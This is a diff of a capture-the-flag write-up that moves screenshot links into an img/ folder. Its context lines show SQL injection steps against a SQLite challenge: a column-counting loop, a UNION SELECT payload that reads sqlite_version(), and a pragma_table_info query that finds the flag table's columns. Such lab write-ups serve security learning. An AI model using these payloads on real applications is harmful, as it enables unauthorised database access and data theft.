@@ -38,7 +38,7 @@ while True:
     payload = payload.rstrip(";--") + ",NULL"
 ```
 
-![6columns](corporatelife2-6-columns.png)
+![6columns](img/corporatelife2-6-columns.png)
 
 Okay, so there are 6 columns
 
@@ -50,7 +50,7 @@ I just checked all of them and found that this is `SQLite`
 0'UNION SELECT sqlite_version(), NULL, NULL, NULL, NULL, NULL;--
 ```
 
-![sqlite](corporatelife2-sqlite.png)
+![sqlite](img/corporatelife2-sqlite.png)
 
 
 Now, I needed to dump all the tables in the database so:
@@ -61,7 +61,7 @@ Now, I needed to dump all the tables in the database so:
 
 After this query, I found 2 tables is `flags` and `requests`
 
-![tables](corporatelife2-tables.png)
+![tables](img/corporatelife2-tables.png)
 
 Obviously, I focused on `flags` table, and the next step is to find its columns
 
@@ -69,7 +69,7 @@ Obviously, I focused on `flags` table, and the next step is to find its columns
 0'UNION SELECT name, NULL, NULL, NULL, NULL, NULL FROM pragma_table_info('flags');--
 ```
 
-![tablecolumns](corporatelife2-table-columns.png)
+![tablecolumns](img/corporatelife2-table-columns.png)
 
 Now I know the `secret_flag` column. And finally, I got the flag with the following query:
 
